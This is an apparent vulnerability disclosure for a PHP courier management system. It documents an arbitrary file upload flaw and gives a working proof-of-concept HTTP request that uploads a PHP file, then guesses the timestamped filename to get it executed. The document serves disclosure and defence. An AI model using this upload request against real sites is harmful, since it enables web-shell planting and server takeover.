# gaatitrack courier management system has an arbitrary file upload vulnerability

Source code download：https://www.sourcecodester.com/php/16848/best-courier-management-system-project-php.html

version：2023/10/27

Vulnerability Description: The system has an Unrestricted Upload of File with Dangerous Type vulnerability [CWE-434], which allows attackers to gain control of the website by uploading malicious PHP files, such as website trojans, to gain control over the server.

Cause of vulnerability occurrence: Vulnerability occurs in gaatitrack/admin_class.php:147, through `move_Uploaded_file` function uploads any file to the `assets/uploads/` directory, and concatenates a timestamp to the filename using `strtotime`

![](https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202312141730524.png)

Then through the ajax.php call the `update_user` function:

![](https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202312141730525.png)

![](https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202312141730526.png)

Vulnerability verification: After setting up the system, access local port 80:

![](https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202312141730527.png)

send payload：

```
POST http://192.168.211.1/gaatitrack/ajax.php?action=update_user HTTP/1.1
Host: 192.168.211.1
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryD9Gu4t2qo3EjzZrD
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 216

------WebKitFormBoundaryD9Gu4t2qo3EjzZrD
Content-Disposition: form-data; name="img"; filename="test.php"
Content-Type: application/octet-stream

<?php
eval(phpinfo());
------WebKitFormBoundaryD9Gu4t2qo3EjzZrD--
```

Return status code 200：

![](https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202312141730528.png)

Use `strtotime` to view the current uploaded timestamp：

![](https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202312141730529.png)

Use burpsuite to blast the uploaded file name：

![](https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202312141730530.png)

![](https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202312141730531.png)

![](https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202312141730532.png)

Successfully uploaded and parsed malicious PHP files
